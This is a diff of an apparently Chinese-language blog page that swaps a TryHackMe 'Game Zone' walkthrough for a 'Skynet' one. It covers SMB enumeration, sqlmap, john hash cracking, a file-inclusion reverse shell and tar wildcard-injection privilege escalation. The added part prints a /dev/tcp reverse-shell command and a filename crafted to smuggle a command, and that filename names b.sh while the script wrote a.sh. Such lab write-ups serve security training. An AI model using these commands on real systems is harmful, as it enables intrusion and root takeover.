@@ -16,34 +16,31 @@
   <meta name="author" content="FSRM">
   <meta name="keywords" content="">
   
-    <meta name="description" content="gamezome信息收集利用-F扫了一下，发现22和80端口开放。  去访问80端口，可以看到有一个登录框。  漏洞利用尝试爆破一下密码。 好像没啥结果，抓个包，用sqlmap跑一下看看，是否存在sql注入。  存在的话，就尝试能否爆出账户和密码。 可以跑出来，但是就是太慢了。。。 1sqlmap -r &amp;#x27;xxxx&#x2F;txt&amp;#x27; --dbms&#x3D;mysql --dump   利用jo">
+    <meta name="description" content="Skynet扫一下端口。  44 80 22 等端口开放，看下80端口。 扫下后台找到登录的地方，尝试爆破密码，结果没结果。 回到445端口，利用enum4linux探测一下samba服务。  用smbclient 去登录anonymous 这个是无密码的。 进入logs下有三个日志文件。  利用more命令进行查看。 只有log1.txt里面有文件。 1234567891011121314151">
 <meta property="og:type" content="article">
-<meta property="og:title" content="gamezome">
-<meta property="og:url" content="http://example.com/2024/11/04/Game%20Zone/index.html">
+<meta property="og:title" content="Skynet">
+<meta property="og:url" content="http://example.com/2024/11/08/Skynet/index.html">
 <meta property="og:site_name" content="FSRM">
-<meta property="og:description" content="gamezome信息收集利用-F扫了一下，发现22和80端口开放。  去访问80端口，可以看到有一个登录框。  漏洞利用尝试爆破一下密码。 好像没啥结果，抓个包，用sqlmap跑一下看看，是否存在sql注入。  存在的话，就尝试能否爆出账户和密码。 可以跑出来，但是就是太慢了。。。 1sqlmap -r &amp;#x27;xxxx&#x2F;txt&amp;#x27; --dbms&#x3D;mysql --dump   利用jo">
+<meta property="og:description" content="Skynet扫一下端口。  44 80 22 等端口开放，看下80端口。 扫下后台找到登录的地方，尝试爆破密码，结果没结果。 回到445端口，利用enum4linux探测一下samba服务。  用smbclient 去登录anonymous 这个是无密码的。 进入logs下有三个日志文件。  利用more命令进行查看。 只有log1.txt里面有文件。 1234567891011121314151">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411052226140.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411052226984.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411052339119.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411061730635.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411061749145.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411061808651.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411061854500.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411062014657.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411062017934.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411062059971.png">
-<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411062059479.png">
-<meta property="article:published_time" content="2024-11-04T12:00:07.677Z">
-<meta property="article:modified_time" content="2024-11-06T13:00:39.147Z">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081707907.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081719421.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081731951.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081754727.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081842564.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081855926.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081922978.png">
+<meta property="og:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411082019254.png">
+<meta property="article:published_time" content="2024-11-08T07:18:52.180Z">
+<meta property="article:modified_time" content="2024-11-08T12:32:53.368Z">
 <meta property="article:author" content="FSRM">
 <meta property="article:tag" content="tryhackme">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411052226140.png">
+<meta name="twitter:image" content="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081707907.png">
   
   
   
-  <title>gamezome - FSRM</title>
+  <title>Skynet - FSRM</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -250,7 +247,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="gamezome"></span>
+            <span id="subtitle" data-typed-text="Skynet"></span>
           
         </div>
 
@@ -261,8 +258,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2024-11-04 20:00" pubdate>
-          2024年11月4日 晚上
+        <time datetime="2024-11-08 15:18" pubdate>
+          2024年11月8日 下午
         </time>
       </span>
     
@@ -273,7 +270,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          461 字
+          1.4k 字
         
       </span>
     
@@ -284,7 +281,7 @@
         
         
         
-          4 分钟
+          12 分钟
         
       </span>
     
@@ -329,42 +326,51 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">gamezome</h1>
+            <h1 id="seo-header">Skynet</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="gamezome"><a href="#gamezome" class="headerlink" title="gamezome"></a>gamezome</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>利用-F扫了一下，发现22和80端口开放。</p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411052226140.png" srcset="/img/loading.gif" lazyload></p>
-<p>去访问80端口，可以看到有一个登录框。</p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411052226984.png" srcset="/img/loading.gif" lazyload></p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>尝试爆破一下密码。</p>
-<p>好像没啥结果，抓个包，用sqlmap跑一下看看，是否存在sql注入。</p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411052339119.png" srcset="/img/loading.gif" lazyload alt="image-20241105233931933"></p>
-<p>存在的话，就尝试能否爆出账户和密码。</p>
-<p>可以跑出来，但是就是太慢了。。。</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sqlmap -r <span class="hljs-string">&#x27;xxxx/txt&#x27;</span> <span class="hljs-attribute">--dbms</span>=mysql --dump<br></code></pre></td></tr></table></figure>
+                <h1 id="Skynet"><a href="#Skynet" class="headerlink" title="Skynet"></a>Skynet</h1><p>扫一下端口。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081707907.png" srcset="/img/loading.gif" lazyload alt="image-20241108170732818"></p>
+<p>44 80 22 等端口开放，看下80端口。</p>
+<p>扫下后台找到登录的地方，尝试爆破密码，结果没结果。</p>
+<p>回到445端口，利用enum4linux探测一下samba服务。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081719421.png" srcset="/img/loading.gif" lazyload alt="image-20241108171939346"></p>
+<p>用smbclient 去登录anonymous 这个是无密码的。</p>
+<p>进入logs下有三个日志文件。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081731951.png" srcset="/img/loading.gif" lazyload alt="image-20241108173147913"></p>
+<p>利用more命令进行查看。</p>
+<p>只有log1.txt里面有文件。</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">cyborg007haloterminator<br>terminator22596<br>terminator219<br>terminator20<br>terminator1989<br>terminator1988<br>terminator168<br>terminator16<br>terminator143<br>terminator13<br>terminator123!@#<br>terminator1056<br>terminator101<br>terminator10<br>terminator02<br>terminator00<br>roboterminator<br>pongterminator<br>manasturcaluterminator<br><span class="hljs-keyword">exterminator95</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">exterminator200</span><br><span class="hljs-keyword"></span>dterminator<br>djxterminator<br>dexterminator<br>determinator<br>cyborg007haloterminator<br>avsterminator<br>alonsoterminator<br>Walterminator<br><span class="hljs-number">79</span>terminator6<br><span class="hljs-number">1996</span>terminator<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411061730635.png" srcset="/img/loading.gif" lazyload alt="image-20241106173007385"></p>
-<p>利用john去解一下这个。</p>
-<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">John pass.txt --wordlist=<span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>rockyou.txt --format=Raw-SHA256<br></code></pre></td></tr></table></figure>
+<p>可能是字典？试一下。</p>
+<p>管理员名字并不是admin 而是 Miles Dyson</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081754727.png" srcset="/img/loading.gif" lazyload alt="image-20241108175413621"></p>
+<p>得到密码之后登录。</p>
+<p>在邮件里面找到milesdyson的smb登录密码。</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">smbclient <span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">50.223</span>/milesdyson -U milesdyson<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411061749145.png" srcset="/img/loading.gif" lazyload alt="image-20241106174906022"></p>
-<p>得到密码之后，ssh连接上去。</p>
-<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>ss -tuln看一下监听的信息。</p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411061808651.png" srcset="/img/loading.gif" lazyload alt="image-20241106180831588"></p>
-<p>利用ssh将10000端口的服务映射到本地。</p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411061854500.png" srcset="/img/loading.gif" lazyload alt="image-20241106185417426"></p>
-<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">ssh</span> -L <span class="hljs-number">10000</span>:localhost:<span class="hljs-number">10000</span> agent47@<span class="hljs-number">10.10.169.5</span><br></code></pre></td></tr></table></figure>
+<p>然后找到了下面这个</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1.</span> <span class="hljs-keyword">Add</span> features <span class="hljs-keyword">to</span> beta CMS /<span class="hljs-number">45</span>kra24zxs28v3yd<br><span class="hljs-number">2.</span> <span class="hljs-keyword">Work</span> <span class="hljs-keyword">on</span> T<span class="hljs-number">-800</span> Model <span class="hljs-number">101</span> blueprints<br><span class="hljs-number">3.</span> Spend more <span class="hljs-type">time</span> <span class="hljs-keyword">with</span> my wife<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411062014657.png" srcset="/img/loading.gif" lazyload alt="image-20241106201439520"></p>
-<p>然后去访问localhost:10000</p>
-<p>是一个登录界面，用上面的用户名和密码登录进去即可。</p>
-<p>然后可以看到是一个cms，版本号可以知道，去查看一下是否存在可利用的漏洞。</p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411062017934.png" srcset="/img/loading.gif" lazyload alt="image-20241106201742824"></p>
-<p>找到一个可以利用的。</p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411062059971.png" srcset="/img/loading.gif" lazyload alt="image-20241106205927779"></p>
-<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411062059479.png" srcset="/img/loading.gif" lazyload alt="image-20241106205939361"></p>
+<p>去访问一下/45kra24zxs28v3yd</p>
+<p>发现没啥东西，后台扫一下。能扫到又是一个新的cms.</p>
+<p>找到一个文件包含漏洞，在本地写一个shell，然后去包含一下，进行一个反弹shell.</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081842564.png" srcset="/img/loading.gif" lazyload alt="image-20241108184257438"></p>
+<p>下面就是提权了。</p>
+<p>就是一个计划任务提权</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081855926.png" srcset="/img/loading.gif" lazyload alt="image-20241108185542856"></p>
+<p>我想的是修改backup.sh 以root身份运行，但是这个backup.sh没权限操作。</p>
+<p>这里看了一下wp 说是tar通配符注入进行提权。</p>
+<p>就是不合理使用*(通配符)，从而导致攻击者可以利用这个来进行提权。</p>
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411081922978.png" srcset="/img/loading.gif" lazyload alt="image-20241108192256910"></p>
+<p>这个sh文件要执行的是切换到web服务器根目录下，将当前所有的文件和文件夹打包到指定的压缩包里面。</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">cd</span> <span class="hljs-string">/var/www/html</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;sh -i &gt;&amp; /dev/tcp/10.14.74.6/4444 0&gt;&amp;1&quot;</span> &gt; a.sh<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; <span class="hljs-string">&quot;--checkpoint-action=exec=bash b.sh&quot;</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&quot;</span> &gt; <span class="hljs-params">--checkpoint=1</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="https://fsrmtuchuang-123.oss-cn-beijing.aliyuncs.com/img2/202411082019254.png" srcset="/img/loading.gif" lazyload alt="image-20241108201927143"></p>
+<p>参考文章：</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/system/176255">https://www.freebuf.com/articles/system/176255</a></p>
 
                 
               </div>
@@ -410,8 +416,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>gamezome</div>
-      <div>http://example.com/2024/11/04/Game Zone/</div>
+      <div>Skynet</div>
+      <div>http://example.com/2024/11/08/Skynet/</div>
     </div>
     <div class="license-meta">
       
@@ -423,13 +429,13 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2024年11月4日</div>
+          <div>2024年11月8日</div>
         </div>
       
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2024年11月6日</div>
+          <div>2024年11月8日</div>
         </div>
       
       
@@ -460,18 +466,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2024/11/08/Skynet/" title="Skynet">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">Skynet</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2024/10/28/HackPark/" title="HackPark">
-                        <span class="hidden-mobile">HackPark</span>
+                      <a href="/2024/11/04/Game%20Zone/" title="gamezome">
+                        <span class="hidden-mobile">gamezome</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
